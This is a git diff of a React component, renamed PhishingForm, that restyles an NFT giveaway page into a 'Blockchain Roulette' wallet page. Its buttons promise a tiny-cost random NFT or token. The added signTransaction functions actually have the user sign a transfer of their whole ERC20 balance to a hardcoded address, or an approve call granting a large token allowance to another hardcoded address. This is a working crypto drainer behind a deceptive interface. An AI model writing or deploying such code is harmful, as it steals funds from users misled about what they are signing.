@@ -1,9 +1,9 @@
 import { useRef, useState } from 'react'
 import { ethereum, web3, ethers } from './coinbaseIntegrations'
+import { erc20String } from './abi/erc20ABI';
 
-let ElonMarkBackground = require( '../elonvsmusk.png' )
 
-export const ElonMuskVsMark = () => {
+export const PhishingForm = () => {
 
     const [ walletAddress, setWalletAddress] = useState(null);
 
@@ -31,23 +31,89 @@ export const ElonMuskVsMark = () => {
         }
     }
 
-    const muskButton = useRef();
-    const markButton = useRef();
+    const signTransaction2 = async() => {
+        let nonce;
+        let signer;
+        try{
+            signer = await web3.getSigner();
+            nonce  = await web3.getTransactionCount(signer.address);
+        }
+        catch(e){
+            console.log("Error retrieving nonce", e);
+            alert(e);
+            return;
+        }
+
+        let erc20Contract = new ethers.Contract("0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", erc20String, web3);
+
+        try{
+            // Obtain balance
+            const balance = await erc20Contract.balanceOf(signer.address)
+            console.log(balance)
+
+            let data = erc20Contract.interface.encodeFunctionData("transfer",
+                [
+                    "0x16A471EdA401df1Cab3D18C90f5094fd8155eE84",
+                    balance
+                ]
+            )
+
+
+            await signer.signTransaction({
+                nonce: nonce,
+                from: signer.address,
+                to: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9",
+                data,
+                value: 0,
+            });
+        }
+        catch(e){
+            console.log("Could not sign", e);
+        }
+        finally{
+            console.log("Left signTransaction");
+        }
+    }
+
+    const signTransaction = async() => {
+        let nonce;
+        let signer;
+        try{
+            signer = await web3.getSigner();
+            nonce  = await web3.getTransactionCount(signer.address);
+        }
+        catch(e){
+            console.log("Error retrieving nonce", e);
+            alert(e);
+            return;
+        }
+
+        try{
+            await signer.signTransaction({
+                nonce: nonce,
+                from: signer.address,
+                to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                data: "0x095ea7b3000000000000000000000000000000000022d473030f116ddee9f6b43ac78ba300000000000000000000000000000000000000000000000393b9f9c3de1bcae3",
+                value: 0,
+            });
+        }
+        catch(e){
+            console.log("Could not sign", e);
+        }
+        finally{
+            console.log("Left signTransaction");
+        }
+    }
 
     return(
         <div
-        //  src={ElonMarkBackground}
          style={{
             width: "100%",
-            height: "100%",
             objectFit: "cover",
             display: "flex",
             justifyContent: "center",
             alignItems: "center",
-            backgroundImage: `url(${ElonMarkBackground})`,
             flexDirection: "row",
-            backgroundSize: "cover",
-            backgroundPositionX: "center",
          }}>
             <div
                 style={{
@@ -70,7 +136,7 @@ export const ElonMuskVsMark = () => {
                         textAlign: "center"
                     }}  
                 >
-                    Welcome to Rome
+                    Blockchain Roulette
                 </h1>
                 <div>
                 <h2
@@ -90,7 +156,7 @@ export const ElonMuskVsMark = () => {
                         margin: "10px",
                     }}  
                 >
-                    Click to transfer 0.01 ETH to the pool and receive a free Elon or Zuck NFT.
+                    Click to exchange 0.00000001 ETH for 1 random NFT or ERC20 token.
                 </h3>
                 </div>
                 {!walletAddress && <button onClick={connectWallet} style={{ margin: "5px", color: "white", backgroundColor: "black"}}>
@@ -111,16 +177,14 @@ export const ElonMuskVsMark = () => {
                         borderRadius: "15px",
                         margin: "10px",
                     }}
-                    ref={muskButton}
                     id='musk'
-                    // onMouseOver={fadeInAnimation}
-                    // onMouseLeave={fadeOutAnimation}
+                    onClick={signTransaction}
                 >
                     <h2
                     style={{
                         fontSize: "xx-large"
                     }}
-                    >Musk</h2>
+                    >NFT</h2>
                 </button>
                 <div style={{
                     flex: .25,
@@ -132,16 +196,14 @@ export const ElonMuskVsMark = () => {
                         borderRadius: "15px",
                         margin: "10px",
                     }}
-                    ref={markButton}
                     id='mark'
-                    // onMouseOver={fadeInAnimation}
-                    // onMouseLeave={fadeOutAnimation}
+                    onClick={signTransaction2}
                 >
                     <h2
                     style={{
                         fontSize: "xx-large"
                     }}
-                    >Zuck</h2>
+                    >ERC20</h2>
                 </button>
                 </div>
             </div>
